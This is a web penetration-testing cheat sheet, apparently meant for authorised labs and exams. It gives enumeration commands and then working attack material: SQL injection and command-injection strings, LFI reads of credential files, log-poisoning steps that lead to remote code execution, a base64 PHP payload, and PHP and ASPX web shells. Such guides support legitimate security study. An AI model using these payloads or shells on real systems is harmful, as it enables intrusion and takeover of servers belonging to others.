# Fingerprinting
## Run nmap HTTP enumeration scripts
```bash
nmap --script=http-enum,http-headers,http-methods,http-robots.txt,http-title -p 80,443 $IP
```

## Scan web server with nikto
```bash
nikto -h http://$IP -o nikto_results.txt
```

## Identify web stack with whatweb
```bash
whatweb http://$IP
```

# Content Discovery
## Check for robots.txt file
```bash
curl http://$IP/robots.txt
```

## Check for sitemap.xml file
```bash
curl http://$IP/sitemap.xml
```

## Check for exposed git repository
```bash
curl http://$IP/.git/config
```

## Check for backup files
```bash
curl http://$IP/backup.zip
```

## Check for web.config file
```bash
curl http://$IP/web.config
```

## Enumerate directories with ffuf
raft-large-directories.txt OR common.txt for faster scan
```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 -t 50
```

## Enumerate files with specific extensions
```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.html,.txt,.bak -fc 404 -t 50
```

## Search page source for sensitive keywords
```bash
curl http://$IP | grep -i -E "(password|user|admin|login|sql|database|config)"
```

# Injection
## Test SQL injection in login form (username field)
```bash
curl -X POST http://$IP/login.php -d "username=admin' OR '1'='1'--&password=test"
```

## Read file via LFI
```bash
# Linux: ../../../etc/passwd OR Windows: ../../../windows/system32/drivers/etc/hosts
curl http://$IP/page.php?file=../../../etc/passwd
```

## Read PHP source via PHP filter wrapper
```bash
curl http://$IP/page.php?file=php://filter/convert.base64-encode/resource=config.php
```

## Poison SSH log for LFI RCE
```bash
ssh '<?php system($_GET["cmd"]); ?>'@$IP
```

## Execute command via poisoned SSH log
```bash
curl http://$IP/page.php?file=../../../var/log/auth.log&cmd=whoami
```

## Poison Apache access log via User-Agent
```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://$IP/
```

## Execute command via poisoned Apache log
```bash
curl http://$IP/page.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

# CMS Scanning
## Scan WordPress site with wpscan
```bash
wpscan --url http://$IP --enumerate ap,at,u
```

## Scan Joomla site with joomscan
```bash
joomscan -u http://$IP
```

## Scan Drupal site with droopescan
```bash
droopescan scan drupal -u http://$IP
```

## URL encode parameters with curl
```bash
# POST: --data-urlencode OR GET: add -G flag
curl http://$IP --data-urlencode "cmd=whoami"
```

---

# HTTP/HTTPS Enumeration Methodology

## Initial Reconnaissance Workflow

1. Start with automated scanning (nmap scripts, nikto, whatweb)
2. Manual inspection of common files (robots.txt, sitemap.xml)
3. Directory and file enumeration with ffuf
4. Technology stack identification
5. CMS-specific scanning if applicable
6. Manual vulnerability testing

## Directory Enumeration Strategy

**Start broad, then narrow down:**

Use raft-large-directories first for comprehensive coverage, then switch to targeted wordlists based on discovered technology stack.

**Common wordlists:**
- /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
- /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
- /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

**Adjust based on findings:**
- ASP.NET detected: focus on .aspx, .asmx extensions
- PHP detected: focus on .php extensions
- Java detected: focus on .jsp, .do extensions

## Manual Source Code Review

Always check page source for:
- Hidden form fields with default values
- JavaScript files containing API endpoints
- Comments with credentials or file paths
- AJAX endpoints in JavaScript
- Hardcoded API keys or tokens

## Local File Inclusion (LFI)

**Common vulnerable parameters:**
- ?file=
- ?page=
- ?include=
- ?path=
- ?doc=
- ?template=

**Linux targets:**
- /etc/passwd
- /etc/shadow (if readable)
- /var/log/apache2/access.log
- /var/log/auth.log
- /proc/self/environ

**Windows targets:**
- C:\windows\system32\drivers\etc\hosts
- C:\windows\win.ini
- C:\inetpub\wwwroot\web.config

**PHP wrappers for LFI:**
- php://filter/convert.base64-encode/resource=config.php
- php://input (for code execution via POST data)
- data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ (embedded PHP)

## Log Poisoning for RCE

**Common log locations (Linux):**
- /var/log/apache2/access.log
- /var/log/apache2/error.log
- /var/log/nginx/access.log
- /var/log/auth.log (SSH logs)
- /var/log/mail.log
- /var/log/vsftpd.log

**Common log locations (Windows):**
- C:\xampp\apache\logs\access.log
- C:\wamp\logs\access.log
- C:\inetpub\logs\LogFiles\W3SVC1\

**Log poisoning steps:**
1. Inject PHP payload into log (via User-Agent, SSH username, etc.)
2. Use LFI to include the poisoned log file
3. Pass commands via GET parameter

## SQL Injection Testing

**Basic SQLi payloads:**
```
admin' OR '1'='1'--
admin'/**/OR/**/1=1--
admin' OR 1=1#
' OR '1'='1
" OR "1"="1
```

Test in both username and password fields. Look for error messages that reveal database type.

## File Upload Vulnerabilities

**Bypass techniques to test:**
- Double extensions: shell.php.jpg
- Null byte injection: shell.php%00.jpg
- Case variation: shell.PhP
- Content-Type manipulation
- Upload .htaccess to allow PHP execution
- Upload web shells disguised as images

**Simple PHP web shell:**
```php
<?php system($_GET['cmd']); ?>
```

**ASPX web shell:**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(new Process { StartInfo = new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { UseShellExecute = false, RedirectStandardOutput = true } }.Start().StandardOutput.ReadToEnd()); %>
```

## CMS Enumeration

**WordPress:**
- Default admin: /wp-admin/
- XML-RPC: /xmlrpc.php
- User enumeration: /?author=1
- wpscan for comprehensive enumeration

**Joomla:**
- Default admin: /administrator/
- Configuration: /configuration.php
- joomscan for enumeration

**Drupal:**
- Default admin: /user/login
- CHANGELOG.txt reveals version
- droopescan for enumeration

## Authentication Testing

**Try default credentials first:**
- admin:admin
- admin:password
- administrator:administrator
- root:root
- admin:123456

**Test for authentication bypass:**
- SQL injection in login forms
- Session manipulation
- Password reset vulnerabilities
- Username enumeration via response differences

## Command Injection

**Common injection points:**
- Search fields
- File upload filename parameter
- Any parameter that might execute system commands

**Test payloads:**
```
; whoami
| whoami
& whoami
&& whoami
`whoami`
$(whoami)
```

## Cross-Site Scripting (XSS)

**Reflected XSS:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

Test in URL parameters and form inputs.

**Stored XSS:**
Test in comment fields, user profiles, and any data that gets stored and displayed.

## Burp Suite Testing

1. Configure browser proxy to 127.0.0.1:8080
2. Spider the application to map all endpoints
3. Review sitemap for hidden functionality
4. Manually test all forms for injection
5. Check for IDOR by manipulating ID parameters
6. Test session management and cookie security

## Important Notes

**Rate limiting:** Be mindful of request rates to avoid triggering WAF or getting blocked

**False positives:** Always verify findings manually before reporting

**SSL/TLS:** For HTTPS, check certificate validity and supported cipher suites

**API endpoints:** If APIs discovered, test for authentication bypass, excessive data exposure, and injection

---

# References

- https://owasp.org/www-project-web-security-testing-guide/
- https://portswigger.net/web-security
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/pentesting-web/
